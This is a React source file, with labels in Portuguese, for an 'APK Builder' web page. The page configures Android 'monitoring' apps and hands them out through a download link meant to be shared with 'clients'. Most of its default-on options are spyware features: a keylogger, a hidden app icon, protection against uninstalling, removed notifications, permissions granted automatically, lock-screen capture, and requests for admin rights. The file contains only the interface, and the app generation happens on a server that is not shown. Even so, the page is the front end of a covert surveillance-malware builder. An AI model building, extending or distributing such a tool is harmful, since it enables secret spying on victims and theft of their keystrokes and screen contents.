'use client';

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Download, Loader2, Copy, Check, Shield, ShieldOff, Eye, EyeOff, Lock, Zap } from "lucide-react";
import { trpc } from "@/lib/trpc";

export default function APKBuilderPage() {
  const [companyName, setCompanyName] = useState("FazTudo");
  const [companyUrl, setCompanyUrl] = useState("https://faztudo.com.br");
  const [logoUrl, setLogoUrl] = useState("https://via.placeholder.com/150");
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  
  // Opções de customização
  const [options, setOptions] = useState({
    protectFromUninstall: true,
    hideApp: false,
    removeNotification: true,
    keylogger: true,
    autoStartup: true,
    autoAllowPermissions: true,
    captureScreen: true,
    hideAppIcon: true,
    requestAdminRights: true,
    keepScreenOn: true,
    batteryOptimization: true,
    dataUsageRequest: true,
  });

  const buildApkMutation = trpc.apk.build.useMutation();

  const toggleOption = (key: keyof typeof options) => {
    setOptions(prev => ({
      ...prev,
      [key]: !prev[key]
    }));
  };

  const handleBuildAPK = async () => {
    if (!companyName.trim()) {
      alert("Por favor, preencha o Nome da Empresa");
      return;
    }
    
    if (!companyUrl.trim()) {
      alert("Por favor, preencha a URL da Empresa");
      return;
    }
    
    try {
      new URL(companyUrl);
    } catch (e) {
      alert("URL da Empresa inválida. Use o formato: https://exemplo.com");
      return;
    }
    
    if (logoUrl.trim()) {
      try {
        new URL(logoUrl);
      } catch (e) {
        alert("URL da Logo inválida. Use o formato: https://exemplo.com/logo.png");
        return;
      }
    }

    setIsBuilding(true);
    setBuildProgress(0);

    try {
      const result = await buildApkMutation.mutateAsync({
        companyName,
        companyUrl,
        logoUrl,
        protectFromUninstall: options.protectFromUninstall,
        options: options,
      });

      setDownloadUrl(result.downloadUrl);
      setBuildProgress(100);
      
      setTimeout(() => {
        setIsBuilding(false);
      }, 1000);
    } catch (error: any) {
      alert(`Erro ao gerar APK: ${error.message}`);
      setIsBuilding(false);
    }
  };

  const copyToClipboard = () => {
    if (downloadUrl) {
      navigator.clipboard.writeText(downloadUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const downloadAPK = () => {
    if (downloadUrl) {
      window.location.href = downloadUrl;
    }
  };

  const optionsList = [
    { key: 'hideApp' as const, label: 'Hidden APK', icon: EyeOff, description: 'Esconder app da tela inicial' },
    { key: 'protectFromUninstall' as const, label: 'Anti-Delete APK', icon: Lock, description: 'Proteção contra desinstalação' },
    { key: 'removeNotification' as const, label: 'Remove Notification Completely', icon: Zap, description: 'Remover notificações' },
    { key: 'keylogger' as const, label: 'Offline/Online Keylogger', icon: Zap, description: 'Capturar teclado' },
    { key: 'autoStartup' as const, label: 'Auto Startup (Xiaomi)', icon: Zap, description: 'Iniciar automaticamente' },
    { key: 'autoAllowPermissions' as const, label: 'Auto Allow Permissions', icon: Zap, description: 'Permitir permissões automaticamente' },
    { key: 'captureScreen' as const, label: 'Capture Screen Lock', icon: Zap, description: 'Capturar tela bloqueada' },
    { key: 'hideAppIcon' as const, label: 'Hide App Icon on Uninstall', icon: EyeOff, description: 'Esconder ícone ao desinstalar' },
    { key: 'requestAdminRights' as const, label: 'Request Admin Rights', icon: Shield, description: 'Solicitar direitos de admin' },
    { key: 'keepScreenOn' as const, label: 'Keep Screen on all time', icon: Zap, description: 'Manter tela ligada' },
    { key: 'batteryOptimization' as const, label: 'Battery Optimization enable Automatically', icon: Zap, description: 'Otimização de bateria automática' },
    { key: 'dataUsageRequest' as const, label: 'Data Usage Request', icon: Zap, description: 'Solicitar uso de dados' },
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Left: Options */}
          <div className="lg:col-span-1">
            <Card className="bg-slate-800 border-slate-700 p-6 sticky top-6">
              <h2 className="text-xl font-bold text-cyan-400 mb-4">🔧 Customize</h2>
              <div className="space-y-3 max-h-96 overflow-y-auto">
                {optionsList.map(({ key, label, icon: Icon }) => (
                  <button
                    key={key}
                    onClick={() => toggleOption(key)}
                    className={`w-full flex items-center justify-between p-3 rounded-lg transition-all ${
                      options[key]
                        ? 'bg-cyan-500/20 border border-cyan-500/50'
                        : 'bg-slate-700/50 border border-slate-600'
                    }`}
                  >
                    <span className="text-sm text-left">{label}</span>
                    <div className={`w-4 h-4 rounded ${options[key] ? 'bg-cyan-500' : 'bg-slate-600'}`} />
                  </button>
                ))}
              </div>
            </Card>
          </div>

          {/* Center: Build */}
          <div className="lg:col-span-2">
            <Card className="bg-slate-800 border-slate-700 p-8">
              <h1 className="text-3xl font-bold text-cyan-400 mb-2">🔨 APK Builder</h1>
              <p className="text-slate-400 mb-6">Crie um APK customizado para sua empresa</p>

              {/* Company Info */}
              <div className="space-y-4 mb-8">
                <div>
                  <label className="block text-sm font-semibold text-slate-300 mb-2">Nome da Empresa *</label>
                  <Input
                    placeholder="Ex: FazTudo"
                    value={companyName}
                    onChange={(e) => setCompanyName(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-slate-300 mb-2">URL da Empresa *</label>
                  <Input
                    placeholder="Ex: https://faztudo.com.br"
                    type="url"
                    value={companyUrl}
                    onChange={(e) => setCompanyUrl(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>

                <div>
                  <label className="block text-sm font-semibold text-slate-300 mb-2">Logo da Empresa (URL)</label>
                  <Input
                    placeholder="Ex: https://..."
                    type="url"
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>
              </div>

              {/* Build Button */}
              <Button
                onClick={handleBuildAPK}
                disabled={isBuilding}
                className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-bold py-3 rounded-lg mb-6"
              >
                {isBuilding ? (
                  <>
                    <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                    Gerando APK... {buildProgress}%
                  </>
                ) : (
                  <>
                    <Download className="w-5 h-5 mr-2" />
                    Build APK
                  </>
                )}
              </Button>

              {/* Progress Bar */}
              {isBuilding && (
                <div className="w-full bg-slate-700 rounded-full h-2 mb-6 overflow-hidden">
                  <div
                    className="bg-gradient-to-r from-cyan-500 to-blue-600 h-full transition-all duration-500"
                    style={{ width: `${buildProgress}%` }}
                  />
                </div>
              )}

              {/* Success Message */}
              {downloadUrl && (
                <div className="bg-green-900/30 border border-green-500/50 rounded-lg p-4 mb-6">
                  <div className="flex items-center mb-3">
                    <Check className="w-5 h-5 text-green-500 mr-2" />
                    <span className="font-semibold text-green-400">APK gerado com sucesso!</span>
                  </div>

                  <div className="bg-slate-700/50 rounded p-3 mb-3">
                    <p className="text-xs text-slate-400 mb-2">Link permanente de download:</p>
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        value={downloadUrl}
                        readOnly
                        className="flex-1 bg-slate-800 border border-slate-600 rounded px-3 py-2 text-sm text-white"
                      />
                      <Button
                        onClick={copyToClipboard}
                        size="sm"
                        className="bg-cyan-500 hover:bg-cyan-600"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  </div>

                  <Button
                    onClick={downloadAPK}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2"
                  >
                    <Download className="w-4 h-4 mr-2" />
                    Baixar APK Agora
                  </Button>

                  <p className="text-xs text-slate-400 mt-3">
                    Compartilhe o link acima com seus clientes para instalar o app de monitoramento
                  </p>
                </div>
              )}

              {/* Recommended Button */}
              <div className="text-center">
                <Button
                  variant="outline"
                  className="border-cyan-500/50 text-cyan-400 hover:bg-cyan-500/10"
                >
                  ✓ Recommended
                </Button>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
}
